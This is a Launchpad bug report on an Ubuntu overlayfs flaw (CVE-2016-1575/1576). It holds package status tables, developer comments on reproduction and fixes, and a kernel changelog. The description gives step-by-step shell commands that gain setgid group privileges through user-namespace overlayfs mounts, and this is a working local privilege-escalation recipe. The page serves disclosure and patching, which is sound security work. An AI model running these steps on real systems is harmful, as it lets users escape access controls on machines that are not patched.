|  | [linux-lts-vivid (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-lts-vivid "Latest release: 3.19.0-80.88~14.04.1, uploaded to main on 2017-01-13 14:50:16.294655+00:00 by John Donnelly (jpdonnelly), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-lts-vivid) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-lts-vivid) | Fix Released | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-lts-vivid) | Won't Fix | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-lts-vivid) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-lts-vivid) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-lts-vivid) | Invalid | Medium | Unassigned |  |
|  | [linux-lts-wily (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-lts-wily "Latest release: 4.2.0-42.49~14.04.1, uploaded to main on 2016-06-29 20:17:21.234907+00:00 by Ben Romer (bromer), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-lts-wily) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-lts-wily) | Fix Released | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-lts-wily) | Won't Fix | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-lts-wily) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-lts-wily) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-lts-wily) | Invalid | Medium | Unassigned |  |
|  | [linux-lts-xenial (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-lts-xenial "Latest release: 4.4.0-148.174~14.04.1, uploaded to main on 2019-05-09 08:11:33.627035+00:00 by Stefan Bader (smb), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-lts-xenial) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-lts-xenial) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-lts-xenial) | New | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-lts-xenial) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-lts-xenial) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-lts-xenial) | Invalid | Medium | Unassigned |  |
|  | [linux-mako (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-mako "Latest release: 3.4.0-7.44, uploaded to universe on 2016-02-25 12:56:10.898575+00:00 by Andy Whitcroft (apw), maintained by Ubuntu Kernel Team (kernel-team)") | New | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-mako) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-mako) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-mako) | New | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-mako) | New | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-mako) | New | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-mako) | New | Medium | Unassigned |  |
|  | [linux-manta (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-manta "Latest release: 3.4.0-6.25, uploaded to universe on 2014-03-23 16:00:10.245172+00:00 by Tim Gardner (timg-tpi), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-manta) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-manta) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-manta) | New | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-manta) | New | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-manta) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-manta) | Invalid | Medium | Unassigned |  |
|  | [linux-raspi2 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-raspi2 "Latest release: 4.15.0-1134.142, uploaded to main on 2023-06-22 14:36:08.230195+00:00 by Manuel Diewald (diewald), maintained by Ubuntu Kernel Team (kernel-team)") | Fix Released | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-raspi2) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-raspi2) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-raspi2) | Won't Fix | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-raspi2) | Fix Released | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-raspi2) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-raspi2) | Invalid | Medium | Unassigned |  |
|  | [linux-snapdragon (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-snapdragon "Latest release: 4.15.0-1152.162, uploaded to main on 2023-06-22 09:48:08.173316+00:00 by Stefan Bader (smb), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-snapdragon) | Invalid | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-snapdragon) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-snapdragon) | New | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-snapdragon) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-snapdragon) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-snapdragon) | Invalid | Medium | Unassigned |  |
|  | [linux-ti-omap4 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux-ti-omap4 "Latest release: 3.2.0-1504.131, uploaded to main on 2017-03-31 15:42:14.421529+00:00 by Stefan Bader (smb), maintained by Ubuntu Kernel Team (kernel-team)") | Invalid | Medium | Unassigned |  |
|  | [Precise](https://bugs.launchpad.net/ubuntu/precise/%2Bsource/linux-ti-omap4) | Won't Fix | Medium | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux-ti-omap4) | Invalid | Medium | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux-ti-omap4) | Won't Fix | Undecided | Unassigned |  |
|  | [Wily](https://bugs.launchpad.net/ubuntu/wily/%2Bsource/linux-ti-omap4) | Invalid | Medium | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux-ti-omap4) | Invalid | Medium | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux-ti-omap4) | Invalid | Medium | Unassigned |  |

### Bug Description

On Ubuntu Trusty but also Ubuntu Wily, following sequence allows to gain group privileges of arbitrary groups that created directories with properties to be found using "find / -perm -02020", e.g.

/usr/local/lib/python3.4 root.staff

/var/lib/libuuid libuuid.libuuid

/var/local root.staff

/var/mail root.mail

For Ubuntu Trusty, following sequence can be used to reproduce the problem:

\* In user/mount namespace:

rm -rf Mnt Test

mkdir Mnt Test

mount -t overlayfs -o lowerdir=/var,upperdir=Test overlayfs Mnt

\* Outside namespace

setfacl -m d:u:[your unpriv uid]:rwx Test

\* Inside:

chmod 02777 Mnt/mail

umount Mnt

\* Outside:

~/CreateSetgidBinary Test/mail/escalate /bin/mount x nonexistent-arg

Test/mail/escalate ~/ReportUidGidCwd

For Ubuntu Wily:

\* Inside:

mkdir Mnt Test Work

mount -t overlayfs -o lowerdir=/var,upperdir=Test,workdir=Work overlayfs Mnt

\* Outside:

setfacl -m d:u::rwx,d:u:[your unpriv uid]:rwx Work/work

\* Inside:

chmod 02777 Mnt/mail

umount Mnt

\* Outside:

~/CreateSetgidBinary Test/mail/escalate /bin/mount x nonexistent-arg

Test/mail/escalate ~/ReportUidGidCwd

CreateSetgidBinary is from <http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>

See also <http://www.halfdog.net/Security/2016/UserNamespaceOverlayfsXattrSetgidPrivilegeEscalation/> (InvitedOnly/lY9yHKQj) and attached sharing policy.

See [original description](comments/0)

Tags:

[kernel-cve-skip-description](/ubuntu/%2Bsource/linux/%2Bbugs?field.tag=kernel-cve-skip-description)
[kernel-cve-tracking-bug](/ubuntu/%2Bsource/linux/%2Bbugs?field.tag=kernel-cve-tracking-bug)

## Related branches

[lp:ubuntu/trusty-security/linux-lts-vivid](https://code.launchpad.net/~ubuntu-branches/ubuntu/trusty/linux-lts-vivid/trusty-security)

[lp:ubuntu/trusty-proposed/linux-lts-vivid](https://code.launchpad.net/~ubuntu-branches/ubuntu/trusty/linux-lts-vivid/trusty-proposed)

[lp:ubuntu/trusty-security/linux-lts-wily](https://code.launchpad.net/~ubuntu-branches/ubuntu/trusty/linux-lts-wily/trusty-security)

[lp:ubuntu/trusty-proposed/linux-lts-wily](https://code.launchpad.net/~ubuntu-branches/ubuntu/trusty/linux-lts-wily/trusty-proposed)

## CVE References

* [2016-1575](/bugs/cve/2016-1575 "The overlayfs implementation in the L...")
* [2016-1576](/bugs/cve/2016-1576 "The overlayfs implementation in the L...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-01-22: |  |  | [#1](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/1) |
| --- | --- | --- | --- |

I've tried reproducing this in up-to-date wily and xenial without success. I get to the "chmod 02777 Mnt/mail" step and get EPERM. Perhaps this was fixed by the same commit which fixed the other setattr-related CVE?

I've tried reproducing this in up-to-date wily and xenial without success. I get to the "chmod 02777 Mnt/mail" step and get EPERM. Perhaps this was fixed by the same commit which fixed the other setattr-related CVE?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-01-22: |  |  | [#2](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/2) |
| --- | --- | --- | --- |

I did reproduce on trusty.

I tried again on wily/xenial. If I run the steps to completion I do end up with a suid/sgid escalate executable owned by ubuntu:mail, but './Test/mail/escalate /bin/sh' still only gives me a process running as ubuntu:ubuntu.

I did reproduce on trusty.
I tried again on wily/xenial. If I run the steps to completion I do end up with a suid/sgid escalate executable owned by ubuntu:mail, but './Test/mail/escalate /bin/sh' still only gives me a process running as ubuntu:ubuntu.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2016-01-22: |  |  | [#3](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/3) |
| --- | --- | --- | --- |

You may wish to try a different end executable than the shells; I think they (all? most?) include mitigations against setuid exploits.

Thanks

You may wish to try a different end executable than the shells; I think they (all? most?) include mitigations against setuid exploits.
Thanks

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2016-01-23: |  |  | [#4](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/4) |
| --- | --- | --- | --- |

I tried wily with

# apt-cache policy linux-image-4.2.0-25-generic

linux-image-4.2.0-25-generic:

  Installed: 4.2.0-25.30

  Candidate: 4.2.0-25.30

  Version table:

 \*\*\* 4.2.0-25.30 0

        500 <http://archive.ubuntu.com/ubuntu/> wily-updates/main amd64 Packages

        500 <http://archive.ubuntu.com/ubuntu/> wily-security/main amd64 Packages

        100 /var/lib/dpkg/status

And was able to to reproduce. I guess on wily /bin/sh might drop EUID for security reasons, I think bash is doing that.

I tried wily with
# apt-cache policy linux-image-4.2.0-25-generic
linux-image-4.2.0-25-generic:
Installed: 4.2.0-25.30
Candidate: 4.2.0-25.30
Version table:
\*\*\* 4.2.0-25.30 0
500 http://archive.ubuntu.com/ubuntu/ wily-updates/main amd64 Packages
500 http://archive.ubuntu.com/ubuntu/ wily-security/main amd64 Packages
100 /var/lib/dpkg/status
And was able to to reproduce. I guess on wily /bin/sh might drop EUID for security reasons, I think bash is doing that.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [halfdog (halfdog)](https://launchpad.net/~halfdog) wrote on 2016-02-13: |  |  | [#5](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/5) |
| --- | --- | --- | --- |

* [Sharing policy for http://www.halfdog.net/Security/2016/UserNamespaceOverlayfsXattrSetgidPrivilegeEscalation/](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/%2Battachment/4570628/%2Bfiles/policy.txt)
  [Edit](/ubuntu/%2Bsource/linux/%2Bbug/1534961/%2Battachment/4570628)
  (681 bytes,
  text/plain)

| **description**: | updated |
| --- | --- |

[Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks)
on 2016-02-15

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | New → Incomplete |
| **status**: | Incomplete → Confirmed |
| **importance**: | Undecided → High |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [J. R. Okajima (hooanon05)](https://launchpad.net/~hooanon05) wrote on 2016-02-17: |  |  | [#6](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/6) |
| --- | --- | --- | --- |

FYI

The security bug hunter "halfdog" kindly told me that this problem can reproduce with AUFS.

I've confirmed and fixed. Here is aufs's approach hoping with a little help for overlayfs.

In copy-up, the internal sequence is

- create an entry on the upper writable layer.

- copy the all attributes from the inode on the lower readonly branch.

The essential fix is inserting vfs\_removexattr(XATTR\_NAME\_POSIX\_ACL\_ACCESS) between them.

For dirs, XATTR\_NAME\_POSIX\_ACL\_DEFAULT should be removed too. And then copy the all attributes including XATTRs.

But removing all ACL\_ACCESS may cause another problem since some fs (for example, NFS) may want ACL which is equivalent to the permission bits. So just after removing XATTR, posix\_acl\_chmod() should be called.

FYI
The security bug hunter "halfdog" kindly told me that this problem can reproduce with AUFS.
I've confirmed and fixed. Here is aufs's approach hoping with a little help for overlayfs.
In copy-up, the internal sequence is
- create an entry on the upper writable layer.
- copy the all attributes from the inode on the lower readonly branch.
The essential fix is inserting vfs\_removexattr(XATTR\_NAME\_POSIX\_ACL\_ACCESS) between them.
For dirs, XATTR\_NAME\_POSIX\_ACL\_DEFAULT should be removed too. And then copy the all attributes including XATTRs.
But removing all ACL\_ACCESS may cause another problem since some fs (for example, NFS) may want ACL which is equivalent to the permission bits. So just after removing XATTR, posix\_acl\_chmod() should be called.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-02-17:  [**Re: [Bug 1534961] Re: insecure overlayfs xattrs handling in copy\_up**](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/7) |  |  | [#7](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/7) |
| --- | --- | --- | --- |

On Wed, Feb 17, 2016 at 06:20:57AM -0000, J. R. Okajima wrote:

> FYI

>

> The security bug hunter "halfdog" kindly told me that this problem can reproduce with AUFS.

> I've confirmed and fixed. Here is aufs's approach hoping with a little help for overlayfs.

>

> In copy-up, the internal sequence is

> - create an entry on the upper writable layer.

> - copy the all attributes from the inode on the lower readonly branch.

>

> The essential fix is inserting vfs\_removexattr(XATTR\_NAME\_POSIX\_ACL\_ACCESS) between them.

> For dirs, XATTR\_NAME\_POSIX\_ACL\_DEFAULT should be removed too. And then copy the all attributes including XATTRs.

> But removing all ACL\_ACCESS may cause another problem since some fs (for example, NFS) may want ACL which is equivalent to the permission bits. So just after removing XATTR, posix\_acl\_chmod() should be called.

Does your AUFS fix do this universally? I see no reason to remove the

xattrs if the mount was done by real root.

In Ubuntu an unprivileged user is allowed to mount overlayfs in a user

namespace, and that's where we run into problems as it allows a user to

create files with privileged xattrs or sxid to another user where they

could not have done so otherwise. These patches make it so that the copy

up will fail if the mounter could not have otherwise created the file in

upperdir with those attrs/xattrs.

Your approach is less extreme, but I have a few concerns. First, it

works for xattrs but not for sxid or seemingly for file capabilities

(though I assume it could be extended to do so). Second (and somewhat

related), there are more privileged xattrs than just ACLs (e.g.

trusted.\* or security.\* for some LSMs) and so it would appear that it

should be extended to filter those as well, but that seems to be

redundant with other checks in the kernel. And finally, this seems to be

inconsistent with standard behavior where setxid/setcap is cleared on

write and not on open.

On Wed, Feb 17, 2016 at 06:20:57AM -0000, J. R. Okajima wrote:
> FYI
>
> The security bug hunter "halfdog" kindly told me that this problem can reproduce with AUFS.
> I've confirmed and fixed. Here is aufs's approach hoping with a little help for overlayfs.
>
> In copy-up, the internal sequence is
> - create an entry on the upper writable layer.
> - copy the all attributes from the inode on the lower readonly branch.
>
> The essential fix is inserting vfs\_removexattr(XATTR\_NAME\_POSIX\_ACL\_ACCESS) between them.
> For dirs, XATTR\_NAME\_POSIX\_ACL\_DEFAULT should be removed too. And then copy the all attributes including XATTRs.
> But removing all ACL\_ACCESS may cause another problem since some fs (for example, NFS) may want ACL which is equivalent to the permission bits. So just after removing XATTR, posix\_acl\_chmod() should be called.
Does your AUFS fix do this universally? I see no reason to remove the
xattrs if the mount was done by real root.
In Ubuntu an unprivileged user is allowed to mount overlayfs in a user
namespace, and that's where we run into problems as it allows a user to
create files with privileged xattrs or sxid to another user where they
could not have done so otherwise. These patches make it so that the copy
up will fail if the mounter could not have otherwise created the file in
upperdir with those attrs/xattrs.
Your approach is less extreme, but I have a few concerns. First, it
works for xattrs but not for sxid or seemingly for file capabilities
(though I assume it could be extended to do so). Second (and somewhat
related), there are more privileged xattrs than just ACLs (e.g.
trusted.\* or security.\* for some LSMs) and so it would appear that it
should be extended to filter those as well, but that seems to be
redundant with other checks in the kernel. And finally, this seems to be
inconsistent with standard behavior where setxid/setcap is cleared on
write and not on open.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Marc Deslauriers (mdeslaur)](https://launchpad.net/~mdeslaur) wrote on 2016-02-17:  [**Re: insecure overlayfs xattrs handling in copy\_up**](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/8) |  |  | [#8](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/8) |
| --- | --- | --- | --- |

This is CVE-2016-1575

This is CVE-2016-1575

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-02-22: |  |  | [#9](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/9) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/9/%2Bdownload) (43.7 KiB)

This bug was fixed in the package linux - 4.2.0-30.35

---------------

linux (4.2.0-30.35) wily; urgency=low

[ Seth Forshee ]

\* SAUCE: cred: Add clone\_cred() interface

    - LP: [#1531747](/bugs/1531747), [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Use mounter's credentials instead of selectively

    raising caps

    - LP: [#1531747](/bugs/1531747), [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\*

    xattrs

    - LP: [#1531747](/bugs/1531747), [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Be more careful about copying up sxid files

    - LP: [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

  \* SAUCE: overlayfs: Propogate nosuid from lower and upper mounts

    - LP: [#1534961](/bugs/1534961), [#1535150](/bugs/1535150)

    - CVE-2016-1575 CVE-2016-1576

linux (4.2.0-29.34) wily; urgency=low

[ Luis Henriques ]

\* Release Tracking Bug

    - LP: [#1543167](/bugs/1543167)

[ Brad Figg ]

\* Revert "SAUCE: apparmor: fix sleep from invalid context"

    - LP: [#1542049](/bugs/1542049)

[ Upstream Kernel Changes ]

\* Revert "af\_unix: Revert 'lock\_interruptible' in stream receive code"

    - LP: [#1540731](/bugs/1540731)

linux (4.2.0-28.33) wily; urgency=low

[ Brad Figg ]

\* Release Tracking Bug

    - LP: [#1540634](/bugs/1540634)

[ Brad Figg ]

\* CONFIG: CONFIG\_DEBUG\_UART\_BCM63XX is not set

[ J. R. Okajima ]

\* SAUCE: ubuntu: aufs: tiny, extract a new func xino\_fwrite\_wkq()

    - LP: [#1533043](/bugs/1533043)

  \* SAUCE: ubuntu: aufs: for 4.3, XINO handles EINTR from the dying process

    - LP: [#1533043](/bugs/1533043)

[ John Johansen ]

\* SAUCE: (no-up): apparmor: fix for failed mediation of socket that is

    being shutdown

    - LP: [#1446906](/bugs/1446906)

  \* SAUCE: apparmor: fix sleep from invalid context

    - LP: [#1539349](/bugs/1539349)

[ Tim Gardner ]

\* [Config] Add pvpanic to virtual flavour

    - LP: [#1537923](/bugs/1537923)

[ Upstream Kernel Changes ]

\* Revert "ACPI / LPSS: allow to use specific PM domain during ->probe()"

    - LP: [#1540532](/bugs/1540532)

  \* tools: Add a "make all" rule

    - LP: [#1536370](/bugs/1536370)

  \* vf610\_adc: Fix internal temperature calculation

    - LP: [#1536370](/bugs/1536370)

  \* iio: lpc32xx\_adc: fix warnings caused by enabling unprepared clock

    - LP: [#1536370](/bugs/1536370)

  \* iio:ad5064: Make sure ad5064\_i2c\_write() returns 0 on success

    - LP: [#1536370](/bugs/1536370)

  \* iio: ad5064: Fix ad5629/ad5669 shift

    - LP: [#1536370](/bugs/1536370)

  \* iio:ad7793: Fix ad7785 product ID

    - LP: [#1536370](/bugs/1536370)

  \* iio: adc: vf610\_adc: Fix division by zero error

    - LP: [#1536370](/bugs/1536370)

  \* mmc: mmc: Improve reliability of mmc\_select\_hs200()

    - LP: [#1536370](/bugs/1536370)

  \* mmc: mmc: Fix HS setting in mmc\_select\_hs400()

    - LP: [#1536370](/bugs/1536370)

  \* mmc: mmc: Move mmc\_switch\_status()

    - LP: [#1536370](/bugs/1536370)

  \* mmc: mmc: Improve reliability of mmc\_select\_hs400()

    - LP: [#1536370](/bugs/1536370)

  \* crypto: qat - don't use userspace pointer

    - LP: [#1536370](/bugs/1536370)

  \* iio: si7020: Swap data byte order

    - LP: [#1536370](/bugs/1536370)

  \* iio: adc: xilinx: Fix VREFN scale

    - LP: [#1536370](/bugs/1536370)

  \* ipmi: Start the timer and thread on internal msgs

    - LP: [#1536370](/bugs/1536370)

  \* drm/i915: quirk backlight present on Macbook 4, 1

    - LP: [#1536370](/bugs/1536370)

  \* drm/i915: get runtime PM reference around GEM set\_caching IOCTL

    - LP: [#1536370](/bugs/1536370)

  \* drm/radeon: Disable uncacheable CPU mappings of GTT with RV6xx

    - LP: [#1536370](/bugs/1536370)

  \*...

This bug was fixed in the package linux - 4.2.0-30.35
---------------
linux (4.2.0-30.35) wily; urgency=low
[ Seth Forshee ]
\* SAUCE: cred: Add clone\_cred() interface
- LP: #1531747, #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Use mounter's credentials instead of selectively
raising caps
- LP: #1531747, #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\*
xattrs
- LP: #1531747, #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Be more careful about copying up sxid files
- LP: #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
\* SAUCE: overlayfs: Propogate nosuid from lower and upper mounts
- LP: #1534961, #1535150
- CVE-2016-1575 CVE-2016-1576
linux (4.2.0-29.34) wily; urgency=low
[ Luis Henriques ]
\* Release Tracking Bug
- LP: #1543167
[ Brad Figg ]
\* Revert "SAUCE: apparmor: fix sleep from invalid context"
- LP: #1542049
[ Upstream Kernel Changes ]
\* Revert "af\_unix: Revert 'lock\_interruptible' in stream receive code"
- LP: #1540731
linux (4.2.0-28.33) wily; urgency=low
[ Brad Figg ]
\* Release Tracking Bug
- LP: #1540634
[ Brad Figg ]
\* CONFIG: CONFIG\_DEBUG\_UART\_BCM63XX is not set
[ J. R. Okajima ]
\* SAUCE: ubuntu: aufs: tiny, extract a new func xino\_fwrite\_wkq()
- LP: #1533043
\* SAUCE: ubuntu: aufs: for 4.3, XINO handles EINTR from the dying process
- LP: #1533043
[ John Johansen ]
\* SAUCE: (no-up): apparmor: fix for failed mediation of socket that is
being shutdown
- LP: #1446906
\* SAUCE: apparmor: fix sleep from invalid context
- LP: #1539349
[ Tim Gardner ]
\* [Config] Add pvpanic to virtual flavour
- LP: #1537923
[ Upstream Kernel Changes ]
\* Revert "ACPI / LPSS: allow to use specific PM domain during ->probe()"
- LP: #1540532
\* tools: Add a "make all" rule
- LP: #1536370
\* vf610\_adc: Fix internal temperature calculation
- LP: #1536370
\* iio: lpc32xx\_adc: fix warnings caused by enabling unprepared clock
- LP: #1536370
\* iio:ad5064: Make sure ad5064\_i2c\_write() returns 0 on success
- LP: #1536370
\* iio: ad5064: Fix ad5629/ad5669 shift
- LP: #1536370
\* iio:ad7793: Fix ad7785 product ID
- LP: #1536370
\* iio: adc: vf610\_adc: Fix division by zero error
- LP: #1536370
\* mmc: mmc: Improve reliability of mmc\_select\_hs200()
- LP: #1536370
\* mmc: mmc: Fix HS setting in mmc\_select\_hs400()
- LP: #1536370
\* mmc: mmc: Move mmc\_switch\_status()
- LP: #1536370
\* mmc: mmc: Improve reliability of mmc\_select\_hs400()
- LP: #1536370
\* crypto: qat - don't use userspace pointer
- LP: #1536370
\* iio: si7020: Swap data byte order
- LP: #1536370
\* iio: adc: xilinx: Fix VREFN scale
- LP: #1536370
\* ipmi: Start the timer and thread on internal msgs
- LP: #1536370
\* drm/i915: quirk backlight present on Macbook 4, 1
- LP: #1536370
\* drm/i915: get runtime PM reference around GEM set\_caching IOCTL
- LP: #1536370
\* drm/radeon: Disable uncacheable CPU mappings of GTT with RV6xx
- LP: #1536370
\* drm/radeon: unconditionally set sysfs\_initialized
- LP: #1536370
\* drm/amdgpu: Fix default page access routing
- LP: #1536370
\* USB: qcserial: Fix support for HP lt4112 LTE/HSPA+ Gobi 4G Modem
- LP: #1536370
\* ext2, ext4: warn when mounting with dax enabled
- LP: #1536370
\* arm64: mm: use correct mapping granularity under DEBUG\_RODATA
- LP: #1536370
\* drm/i915: Don't clobber the addfb2 ioctl params
- LP: #1536370
\* arm64: kernel: pause/unpause function graph tracer in cpu\_suspend()
- LP: #1536370
\* usb: chipidea: debug: disable usb irq while role switch
- LP: #1536370
\* xhci: Fix a race in usb2 LPM resume, blocking U3 for usb2 devices
- LP: #1536370
\* fat: fix fake\_offset handling on error path
- LP: #1536370
\* kernel/signal.c: unexport sigsuspend()
- LP: #1536370
\* parisc: Drop unused MADV\_xxxK\_PAGES flags from asm/mman.h
- LP: #1536370
\* mmc: remove bondage between REQ\_META and reliable write
- LP: #1536370
\* stmmac: avoid ipq806x constant overflow warning
- LP: #1536370
\* perf symbols: Fix dso lookup by long name and missing buildids
- LP: #1536370
\* net/mlx4\_core: Avoid returning success in case of an error flow
- LP: #1536370
\* mtd: nand: fix shutdown/reboot for multi-chip systems
- LP: #1536370
\* FS-Cache: Add missing initialization of ret in cachefiles\_write\_page()
- LP: #1536370
\* ipvlan: fix leak in ipvlan\_rcv\_frame
- LP: #1536370
\* ipvlan: fix use after free of skb
- LP: #1536370
\* macvlan: fix leak in macvlan\_handle\_frame
- LP: #1536370
